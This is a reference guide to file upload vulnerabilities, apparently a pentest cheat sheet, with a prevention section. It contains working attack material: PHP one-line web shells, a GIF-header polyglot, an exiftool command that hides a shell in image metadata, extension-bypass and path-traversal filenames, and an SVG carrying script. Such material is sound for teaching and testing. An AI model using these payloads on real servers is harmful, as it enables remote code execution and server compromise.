# File Upload Vulnerabilities Reference Guide

## Overview

File upload vulnerabilities allow attackers to upload malicious files to the server, potentially leading to remote code execution, server compromise, or other security issues.

## Types of File Upload Vulnerabilities

### 1. Unrestricted File Upload
- No validation on file type or content
- Direct upload to web-accessible directory

### 2. Extension Validation Bypass
- Weak extension checking
- Multiple extensions
- Null byte injection

### 3. Content-Type Bypass
- MIME type validation only
- Modifiable Content-Type header

### 4. Magic Bytes Bypass
- Only checks file signatures
- Can be spoofed

## Common Bypass Techniques

### Extension Bypass
```
shell.php
shell.php.jpg
shell.php.
shell.php%00.jpg
shell.pHp
shell.PHP
shell.php5
shell.phtml
shell.shtml
shell.htaccess
shell.phps
shell.phpt
shell.phar
shell.inc
```

### Double Extensions
```
shell.php.jpg
shell.php.png
shell.gif.php
shell.jpg.php
```

### Null Byte Injection
```
shell.php%00.jpg
shell.php%00.png
```

### Case Variations
```
shell.pHp
shell.PHP
shell.PhP
```

### Alternative Extensions
```
PHP: .php, .php2, .php3, .php4, .php5, .phtml, .phps, .phpt, .pht, .phar, .inc
ASP: .asp, .aspx, .ascx, .ashx, .asmx, .axd, .cshtml
JSP: .jsp, .jspx, .jsw, .jsv, .jspf
Perl: .pl, .pm, .cgi
Python: .py, .pyc, .pyo
Ruby: .rb, .rbw, .rhtml
```

## Malicious File Types

### PHP Shells
```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php eval($_GET['cmd']); ?>
<?php assert($_GET['cmd']); ?>
```

### Web Shells
```php
<?php @eval($_POST['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

### Image with PHP
```
GIF89a;
<?php system($_GET['cmd']); ?>
```

### SVG with JavaScript
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>
```

## Content-Type Bypass

### Modifying Content-Type
```
Content-Type: application/x-php
Content-Type: application/octet-stream
Content-Type: text/plain
Content-Type: application/x-httpd-php
```

### Common Content-Types
```
image/jpeg
image/png
image/gif
image/bmp
application/pdf
application/zip
application/x-php
application/x-httpd-php
```

## Magic Bytes

### Common File Signatures
```
JPEG: FF D8 FF
PNG: 89 50 4E 47
GIF: 47 49 46 38
PDF: 25 50 44 46
ZIP: 50 4B 03 04
PHP: <?php
```

### Adding Magic Bytes
```php
# Add GIF header before PHP code
GIF89a;
<?php system($_GET['cmd']); ?>
```

```bash
# Using exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

## Path Traversal in Upload

### Upload Path Manipulation
```
../../shell.php
../shell.php
../../../shell.php
....//....//....//shell.php
```

## Race Conditions

### Time-of-Check to Time-of-Use (TOCTOU)
1. Upload legitimate file
2. Server validates
3. Replace with malicious file before processing
4. Server processes malicious file

## Detection Methods

### Upload Test Files
```
test.php - Basic PHP file
test.jpg.php - Double extension
test.php%00.jpg - Null byte
test.phtml - Alternative extension
.htaccess - Apache config
```

### Test Content
```php
<?php echo "Upload Success: " . __FILE__; ?>
```

### Verify Execution
```
http://target.com/uploads/test.php
```

## Prevention

### 1. Extension Whitelist
```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die("Invalid file type");
}
```

### 2. Content Validation
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $tmp_name);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_mimes)) {
    die("Invalid file type");
}
```

### 3. Rename Uploaded Files
```php
$new_filename = md5(uniqid()) . '.' . $ext;
move_uploaded_file($tmp_name, '/uploads/' . $new_filename);
```

### 4. Store Outside Web Root
```
/var/www/uploads/  (not accessible via web)
```

### 5. Disable Script Execution
```apache
# .htaccess in upload directory
RemoveHandler .php .phtml .php3 .php4 .php5
AddType text/plain .php .phtml .php3 .php4 .php5
```

### 6. Content Security Policy
```
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'self'
```

### 7. Image Processing
```php
// Re-process image to remove embedded code
$image = imagecreatefromjpeg($tmp_name);
imagejpeg($image, $destination);
```

## Tools

- Burp Suite: Manual testing and interception
- Fuxploider: Automated file upload vulnerability scanner
- Upload Bypass: File upload bypass techniques

## References

- OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- PortSwigger File Upload: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
